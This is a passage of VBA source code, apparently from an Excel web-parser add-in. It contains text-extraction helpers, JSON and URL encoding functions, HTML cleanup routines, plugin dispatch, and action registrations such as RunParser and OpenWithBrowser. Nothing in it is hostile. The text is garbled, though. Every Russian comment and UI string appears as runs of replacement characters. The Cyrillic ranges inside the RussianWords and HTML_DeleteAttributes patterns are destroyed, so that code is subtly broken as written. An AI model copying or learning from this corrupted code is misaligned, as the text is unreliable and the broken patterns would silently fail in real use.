    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim res$, i&, letter$, l&, arr
    If MaxLen& = 0 Then MaxLen& = 10000
    For i = 1 To Len(txt)
        letter$ = Mid$(txt, i, 1)
        res$ = res$ & IIf(letter Like "[|fffd|-|fffd||fffd||fffd|]", letter, " ")
    Next i
    arr = Split(Application.Trim(res$))
    For i = LBound(arr) To UBound(arr)
        l& = Len(arr(i))
        If l < MinLen& Or l > MaxLen& Then arr(i) = ""
    Next i
    RussianWords = Application.Trim(Join(arr))
End Function

Function EnglishWords(ByVal txt As String, ByVal MinLen&, ByVal MaxLen&)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim res$, i&, letter$, l&, arr
    If MaxLen& = 0 Then MaxLen& = 10000
    For i = 1 To Len(txt)
        letter$ = Mid$(txt, i, 1)
        res$ = res$ & IIf(letter Like "[A-z]", letter, " ")
    Next i
    arr = Split(Application.Trim(res$))
    For i = LBound(arr) To UBound(arr)
        l& = Len(arr(i))
        If l < MinLen& Or l > MaxLen& Then arr(i) = ""
    Next i
    EnglishWords = Application.Trim(Join(arr))
End Function

Function TextBetween(ByVal txt$, ByVal part1$, ByVal part2$, Optional ResultIndex$ = "", Optional AddTextBeforeAndAfter As Boolean) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| TXT |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| part1$,
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| part2$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ARSEP$)
    On Error Resume Next
    Dim arr, i&, res$, ind&
    Select Case ""
        Case part1$ & part2$
            TextBetween = txt
            Exit Function
        Case part1$
            arr = Split(txt, part2$)
            arr(UBound(arr)) = ""
        Case part2$
            arr = Split(txt, part1$)
            arr(0) = ""
        Case Else
            arr = Split(txt, part1$)
            arr(0) = ""
            For i = LBound(arr) To UBound(arr)
                If InStr(1, arr(i), part2$, vbTextCompare) Then arr(i) = Split(arr(i), part2$)(0) Else arr(i) = ""
            Next i
    End Select
    If AddTextBeforeAndAfter Then
        For i = LBound(arr) To UBound(arr)
            If Len(arr(i)) Then arr(i) = part1$ & arr(i) & part2$
        Next i
    End If
    
    txt = Join(arr, ARSEP)
    RemoveExtraSeparators txt
    
    If Len(ResultIndex$) * Len(txt) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If InStr(1, ResultIndex$, "last", vbTextCompare) > 0 Then
            ind& = UBound(Split(txt, ARSEP)) + Val(Split(ResultIndex$, "last")(1))
        Else
            ind& = Fix(Val(ResultIndex$)) - 1
        End If
        
        If ind& >= 0 And ind& <= UBound(Split(txt, ARSEP)) Then
            txt = Split(txt, ARSEP)(ind&)
        Else
            If ResultIndex$ Like "*#*" Then txt = ""
        End If
    End If
    
    TextBetween = txt
End Function

Function ReplaceChars(ByVal txt$, ByVal CharsList$, ByVal Replacement$) As String
    On Error Resume Next: Dim i&
    For i = 1 To Len(CharsList$)
        txt$ = Replace(txt$, Mid(CharsList$, i, 1), Replacement$)
    Next
    ReplaceChars = txt
End Function

Function JSON_decode(ByVal txt$) As String
    On Error Resume Next
    REGEXP.Pattern = "\\u[A-Fa-f0-9]{4}"
    
    JSON_decode = txt$
    Dim coll As New Collection, char$, item As Variant, objMatches As Object, m As Object
    If REGEXP.test(txt$) Then
        Set objMatches = REGEXP.Execute(txt$)        ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| \u034a
        For Each m In objMatches
            coll.Add m.value, CStr(m.value)
        Next
    End If
    
    For Each item In coll        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
        char$ = ChrW(Val(Replace(item, "\u", "&h")))        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| \u0410 |fffd| |fffd||fffd||fffd|
        txt = Replace(txt, item, char$)
    Next
    
    For Each item In Array("""", "/")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        txt = Replace(txt, "\" & item, item)
    Next
    txt = Replace(txt, "\n", vbNewLine)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    
    JSON_decode = txt$
End Function

Function HTML_DeleteSpaces(ByVal txt$)
    On Error Resume Next
    REGEXP.Pattern = "[\s\n\r\t]+"
    HTML_DeleteSpaces = REGEXP.Replace(txt$, " ")
    HTML_DeleteSpaces = Replace(HTML_DeleteSpaces, "> <", "><")
End Function

Function HTML_DeleteAttributes(ByVal txt$)
    On Error Resume Next
    With REGEXP
        .Pattern = "(<[A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|1-6]+)[^<>]*(>)"
        txt$ = .Replace(txt$, "$1$2")
        .Pattern = ">\s*<"
        txt$ = .Replace(txt$, "><")
    End With
    HTML_DeleteAttributes = txt$
End Function

'Private Function HTML_DeleteAttributes2(ByVal txt$, Optional AllowedAttr$)
' ? HTML_DeleteAttributes2("<a class='level2 ' href='/programmes/Parser/manuals/setting/procedure' test=1 src=""333"">|fffd||fffd||fffd||fffd||fffd|</a>", "tt")

'    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
'    On Error Resume Next
'    With REGEXP
'        .Pattern = "(<[A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|1-6]+)[^<>]*?( (" & Trim(AllowedAttr$) & ")=['""][^'""<>]*['""])[^<>]*(>)"
'        Debug.Print .Pattern
'        Debug.Print 1, .Replace(txt$, "$1")
'        Debug.Print 2, .Replace(txt$, "$2")
'        Debug.Print 4, .Replace(txt$, "$4")
'
'        txt$ = .Replace(txt$, "$1$2$4")
'        .Pattern = ">\s*<"
'        txt$ = .Replace(txt$, "><")
'    End With
'    HTML_DeleteAttributes2 = txt$
'End Function

Function URLEncode(ByVal txt As String, Optional ByVal Mode As Long = 0) As String
    On Error Resume Next: Dim i&, l$, t$
    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)
        
        If Mode = 2 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URLencode   http://en.wikipedia.org/wiki/Percent-encoding
            Select Case AscW(l)
                Case Is > 4095
                    t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
                Case 48 To 57, 45, 46, 95, 65 To 90, 97 To 122, 126
                    t = l
                Case Is > 127
                    t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
                Case Else
                    t = "%" & Hex(AscW(l)): If Len(t) = 2 Then t = "%0" & Hex(AscW(l))
            End Select
            
        Else
            Select Case AscW(l)
                Case Is > 4095
                    t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
                Case Is > 127
                    If Mode = 1 Then
                        t = "%" & Hex(Asc(l))
                    Else
                        t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
                    End If
                Case 32: t = "+"
                Case Else: t = l
            End Select
        End If
        URLEncode = URLEncode & t
    Next
End Function

' ==============================

Function ApplyPluginArrayAction(ByRef txt$, ByVal MacroFunctionName$, Optional ByRef parameters As Dictionary) As Long
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TXT |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TXT
    
    Dim arr, res As Variant
    txt = Replace(txt, TEMP_ARSEP$, ARSEP$)
    If txt = "" Then arr = Array("") Else arr = Split(txt, ARSEP)
    
    res = Run(MacroFunctionName$, arr, parameters)
    If IsArray(res) Then
        txt = Join(res, ARSEP)
    Else
        txt = res
    End If
    RemoveExtraSeparators txt
End Function


Function ApplyPluginNormalAction(ByRef txt_before$, ByVal MacroFunctionName$, Optional ByRef parameters As Dictionary) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt_before$  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt_before$
    
    Dim txt$, arri&, res As Variant, arr
    On Error Resume Next: Err.Clear
    
    If txt_before$ = "" Then
        arr = Array("")
    Else
        arr = Split(txt_before$, ARSEP)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    End If
    
    For arri = LBound(arr) To UBound(arr)
        txt = Trim(arr(arri))
        
        res = Run(MacroFunctionName$, (txt), parameters)
        If IsArray(res) Then
            txt = Join(res, ARSEP)
        Else
            txt = res
        End If
        
        txt = Replace(txt, "{value_index}", arri + 1)
        arr(arri) = txt
    Next arri
    
    txt_before = Join(arr, ARSEP)
    Erase arr
    RemoveExtraSeparators txt_before
End Function


Attribute VB_Name = "mod_AAs_Another"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_Another
' Author        : EducatedFool                     Date: 24.04.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Binary: Option Private Module

Sub InitializeActions_Another(ByRef AAs As ArrayActions)

    With AAs.AddAction(fc_Another, "RunActionSet", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine _
                       & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|) |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|)"
        .AddParameter "Name", aps_RuntimeList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "ActionSets"
        .AddParameter "Pattern", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("*", "*tp*://?*.?*"), "*"
        .AddParameter "CheckMode", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "ReturnValue", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With

    With AAs.AddAction(fc_Another, "RunParser", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| VarName1=text1&VarName2=text2"
        .AddParameter "Name", aps_RuntimeList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "ParsersList"
        .AddParameter "Variables", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "SendCurrentValue", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With

    With AAs.AddAction(fc_Another, "GetParsersList", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Mask", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "*"
        .AddParameter "SelectedOnly", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "1", "2", "3", "4"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Another, "OpenWithBrowser", "INFO: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| html (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), - |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| txt, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| chars, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Extension", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)", Array("html", "xml", "txt", "chars"), "html"
    End With

    Dim MSGBOX_OPTIONS: MSGBOX_OPTIONS = Array("0 = OK", "1 = OK / |fffd||fffd||fffd||fffd||fffd||fffd|", "2 = |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                                               "36 = 4 (|fffd||fffd| / |fffd||fffd||fffd|) + 32 (Question)", "261 = 5 (|fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd|) + 256 (DefaultButton2)")
    With AAs.AddAction(fc_Another, "MsgBox", "INFO: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (MsgBox)")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
